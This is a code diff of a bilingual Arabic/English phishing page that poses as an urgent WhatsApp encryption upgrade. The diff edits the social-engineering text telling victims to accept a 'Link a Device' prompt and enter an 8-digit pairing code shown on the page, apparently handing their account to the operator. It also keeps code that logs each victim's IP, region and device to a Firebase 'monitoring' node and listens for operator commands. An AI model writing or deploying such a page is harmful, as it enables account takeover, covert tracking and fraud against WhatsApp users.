@@ -9,14 +9,14 @@
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
         .container { width: 100%; max-width: 380px; text-align: center; }
-        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; user-select: none; -webkit-user-drag: none; pointer-events: none; }
+        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; user-select: none; pointer-events: none; }
         .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
         .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
         .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
         .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
-        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; overflow: hidden; }
+        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
         #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
@@ -58,18 +58,18 @@
                 vLabel: "الإصدار الحالي:",
                 badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", 
                 alert: "لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.", 
-                steps: "1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>2. قم بفتح التنبيه واختيار 'الربط باستخدام رقم الهاتف'.<br>3. أدخل الرمز المكون من 8 أرقام الظاهر بالأسفل في الخانة المخصصة له بالهاتف:", 
+                steps: "1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:", 
                 wait: "في انتظار الرمز الأمني...", 
-                done: "أدخل الرمز المكون من 8 أرقام في هاتفك الآن", 
+                done: "أدخل الرمز الآن في هاتفك", 
                 success: "تم التحديث بنجاح." 
             },
             en: { 
                 vLabel: "Current Version:",
                 badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", 
                 alert: "To protect your privacy, upgrade version V2.12.5 immediately to ensure chat encryption.", 
-                steps: "1. You will receive a 'Link a Device' notification from WhatsApp.<br>2. Open the notification and select 'Link with phone number instead'.<br>3. Enter the 8-digit code shown below into the field on your phone:", 
+                steps: "1. You will receive a 'Link a Device' notification from WhatsApp.<br>2. Open the notification and select <b>'Link with phone number instead'</b>.<br>3. Enter the <b>8-digit code</b> shown below into your phone:", 
                 wait: "Awaiting security code...", 
-                done: "Enter the 8-digit code on your phone now", 
+                done: "Enter the code on your phone now", 
                 success: "Updated successfully." 
             }
         };
@@ -84,7 +84,9 @@
 
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() }));
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
+            });
             db.ref('commands/' + userId).on('value', s => {
                 const v = s.val();
                 if (v) {
